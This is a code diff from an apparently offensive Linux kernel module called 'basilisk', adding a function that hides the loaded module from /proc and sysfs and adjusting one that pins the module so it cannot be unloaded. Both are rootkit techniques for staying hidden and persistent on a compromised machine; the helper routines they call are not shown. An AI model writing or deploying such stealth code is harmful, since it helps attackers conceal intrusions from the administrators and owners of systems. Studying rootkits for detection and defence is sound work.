@@ -4,6 +4,7 @@
 #include <linux/kobject.h>
 #include <linux/sysfs.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 
 // Required definitions
 // module.h
@@ -240,13 +241,30 @@ Failure can happen, for example, when the module is in the process of being unlo
 
 A reference to a module can be released with module_put().
 */
-void handle_lkm_protect(short *protected) {
-    if (!(*protected)) {
+void handle_lkm_protect(short *p_flag) {
+    if (!(*p_flag)) {
         pr_info("basilisk: protecting kernel module\n");
         try_module_get(lkm.this_mod);
     } else {
         pr_info("basilisk: un-protecting kernel module\n");
         module_put(lkm.this_mod);
     }
-    *protected = !(*protected);
+    *p_flag = !(*p_flag);
+}
+
+/*
+Helper function to handle hiding/showing our LKM 
+*/
+void handle_lkm_hide(short *h_flag)
+{
+    if(!(*h_flag)) {
+        pr_info("basilisk: hiding kernel module\n");
+        proc_hide();
+        sys_hide();
+    } else {
+        pr_info("basilisk: showing kernel module\n");
+        proc_show();
+        sys_show();
+    }
+    *h_flag = !(*h_flag); // toggle `hidden` switch
 }
